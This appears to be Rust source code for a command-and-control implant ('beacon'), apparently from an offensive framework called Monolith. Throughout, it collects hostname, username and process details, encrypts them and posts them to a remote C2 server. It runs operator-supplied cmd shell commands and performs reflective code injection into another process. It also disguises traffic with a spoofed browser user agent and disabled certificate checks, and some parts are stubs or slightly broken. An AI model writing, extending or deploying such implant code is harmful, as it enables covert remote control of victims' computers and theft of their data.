//! C2 beacon implementation.
//!
//! Handles:
//! - Registration / check-in
//! - Task polling
//! - Task execution (shell, upload, download, sleep, exit)
//! - Response encryption and exfiltration
//!
//! Network transport:
//! - Preferred: WinHTTP (Windows native TLS stack, blends with normal traffic)
//! - Fallback: reqwest (rustls-tls, easier but more fingerprintable)

use crate::crypto::CryptoEngine;
use crate::loader::ReflectiveLoader;
use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{Duration, SystemTime};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconCheckin {
    pub beacon_id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub integrity: String,
    pub tasks: Vec<TaskResult>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResult {
    pub task_id: String,
    pub result: String,
    pub status: String,
    pub timestamp: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Task {
    pub task_id: String,
    pub action: String,
    pub arguments: Vec<String>,
    pub timestamp: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconResponse {
    pub beacon_id: String,
    pub results: Vec<TaskResult>,
}

pub struct Beacon {
    c2_url: String,
    crypto: CryptoEngine,
    beacon_id: String,
    base_sleep: u64,
    jitter_percent: u64,
    task_counter: u64,
    use_winhttp: bool,
}

impl Beacon {
    pub fn new(c2_url: String, crypto: CryptoEngine, base_sleep: u64, jitter_percent: u64) -> Self {
        let use_winhttp = std::env::var("MONOLITH_USE_WINHTTP")
            .map(|v| v == "1" || v.to_lowercase() == "true")
            .unwrap_or(false);

        let beacon_id = generate_beacon_id();
        Self {
            c2_url,
            crypto,
            beacon_id,
            base_sleep,
            jitter_percent,
            task_counter: 0,
            use_winhttp,
        }
    }

    pub fn checkin(&mut self) -> Result<(), String> {
        let checkin = BeaconCheckin {
            beacon_id: self.beacon_id.clone(),
            hostname: get_hostname(),
            username: get_username(),
            os: get_os(),
            arch: get_arch(),
            pid: std::process::id(),
            integrity: get_integrity(),
            tasks: Vec::new(),
        };

        let payload = serde_json::to_vec(&checkin).map_err(|e| e.to_string())?;
        let encrypted = self.crypto.encrypt(&payload);

        if self.use_winhttp {
            self.post_winhttp("/api/beacon/checkin", &encrypted)?;
        } else {
            self.post_reqwest("/api/beacon/checkin", &encrypted)?;
        }
        Ok(())
    }

    pub fn poll_task(&mut self) -> Option<Task> {
        // In production: GET /api/beacon/{id}/tasks
        None
    }

    pub fn execute_task(&mut self, task: Task) -> Result<TaskResult, String> {
        let result = match task.action.as_str() {
            "shell" => execute_shell(&task.arguments.join(" ")),
            "sleep" => {
                let secs = task.arguments.first().and_then(|v| v.parse().ok()).unwrap_or(60);
                std::thread::sleep(Duration::from_secs(secs));
                format!("Slept for {}s", secs)
            }
            "exit" => std::process::exit(0),
            "inject" => execute_reflective_inject(&task.arguments),
            _ => format!("Unknown action: {}", task.action),
        };

        Ok(TaskResult {
            task_id: task.task_id,
            result,
            status: "success".into(),
            timestamp: Utc::now().timestamp(),
        })
    }

    pub fn jittered_sleep(&self) -> Duration {
        let jitter = (self.base_sleep * self.jitter_percent / 100) as i64;
        let delta = (rand::random::<i64>() % (jitter * 2)) - jitter;
        let secs = (self.base_sleep as i64 + delta).max(1) as u64;
        Duration::from_secs(secs)
    }

    fn post_reqwest(&self, path: &str, data: &[u8]) -> Result<(), String> {
        let url = format!("{}{}", self.c2_url, path);
        let client = reqwest::blocking::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| e.to_string())?;

        let res = client
            .post(&url)
            .header("Content-Type", "application/octet-stream")
            .body(data.to_vec())
            .send()
            .map_err(|e| e.to_string())?;

        if res.status().is_success() {
            Ok(())
        } else {
            Err(format!("HTTP {}", res.status()))
        }
    }

    #[cfg(windows)]
    fn post_winhttp(&self, path: &str, data: &[u8]) -> Result<(), String> {
        use windows::Win32::Networking::WinHttp::*;
        use windows::Win32::Foundation::*;

        let url = format!("{}{}", self.c2_url, path);
        let url_wide: Vec<u16> = url.encode_utf16().chain(std::iter::once(0)).collect();

        unsafe {
            let mut session: HINTERNET = Default::default();
            let mut connect: HINTERNET = Default::default();
            let mut request: HINTERNET = Default::default();

            let user_agent = windows::core::w!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edge/122.0.0.0");
            let r = WinHttpOpen(
                user_agent,
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS,
                0,
            );
            if r.is_invalid() { return Err("WinHttpOpen failed".into()); }
            session = r;

            let parsed = windows::core::HSTRING::from(url);
            let hostname = parsed.split('/').next().unwrap_or(&parsed);

            let host_wide: Vec<u16> = hostname.encode_utf16().chain(std::iter::once(0)).collect();
            let r = WinHttpConnect(
                session,
                windows::core::PCWSTR::from_raw(host_wide.as_ptr()),
                INTERNET_DEFAULT_HTTPS_PORT,
                0,
            );
            if r.is_invalid() {
                WinHttpCloseHandle(session);
                return Err("WinHttpConnect failed".into());
            }
            connect = r;

            let path_wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
            let r = WinHttpOpenRequest(
                connect,
                windows::core::w!("POST"),
                windows::core::PCWSTR::from_raw(path_wide.as_ptr()),
                None,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE,
            );
            if r.is_invalid() {
                WinHttpCloseHandle(connect);
                WinHttpCloseHandle(session);
                return Err("WinHttpOpenRequest failed".into());
            }
            request = r;

            // Force TLS 1.2 + 1.3
            let mut protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
            let r = WinHttpSetOption(
                request,
                WINHTTP_OPTION_SECURE_PROTOCOLS,
                &mut protocols as *mut _ as *mut _,
                std::mem::size_of::<u32>() as u32,
            );
            if r.is_err() {
                WinHttpCloseHandle(request);
                WinHttpCloseHandle(connect);
                WinHttpCloseHandle(session);
                return Err("WinHttpSetOption failed".into());
            }

            // Send request
            let r = WinHttpSendRequest(
                request,
                WINHTTP_NO_ADDITIONAL_HEADERS,
                0,
                Some(data.as_ptr() as *const u8),
                data.len() as u32,
                data.len() as u32,
                0,
            );
            if r.is_err() {
                WinHttpCloseHandle(request);
                WinHttpCloseHandle(connect);
                WinHttpCloseHandle(session);
                return Err("WinHttpSendRequest failed".into());
            }

            let r = WinHttpReceiveResponse(request, None);
            if r.is_err() {
                WinHttpCloseHandle(request);
                WinHttpCloseHandle(connect);
                WinHttpCloseHandle(session);
                return Err("WinHttpReceiveResponse failed".into());
            }

            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            Ok(())
        }
    }

    #[cfg(not(windows))]
    fn post_winhttp(&self, path: &str, data: &[u8]) -> Result<(), String> {
        self.post_reqwest(path, data)
    }
}

fn generate_beacon_id() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
    format!("{:08x}", ts)
}

fn get_hostname() -> String {
    std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
}

fn get_username() -> String {
    std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into())
}

fn get_os() -> String {
    std::env::consts::OS.to_string()
}

fn get_arch() -> String {
    std::env::consts::ARCH.to_string()
}

fn get_integrity() -> String {
    "medium".into()
}

fn execute_shell(cmd: &str) -> String {
    use std::process::Command;
    match Command::new("cmd").args(["/C", cmd]).output() {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("{}\n{}", stdout, stderr)
        }
        Err(e) => format!("Shell error: {}", e),
    }
}

fn execute_reflective_inject(args: &[String]) -> String {
    if args.len() < 2 {
        return "Usage: inject <pid> <base64_pe>".into();
    }
    let pid: u32 = args[0].parse().unwrap_or(0);
    let b64 = &args[1];
    if let Ok(pe_bytes) = base64::decode(b64) {
        unsafe {
            if let Some(_entry_point) = ReflectiveLoader::phantom_module_overload(&pe_bytes) {
                return format!("Phantom module overload executed into PID {}", pid);
            }
        }
    }
    "Inject failed: invalid PE or load error".into()
}
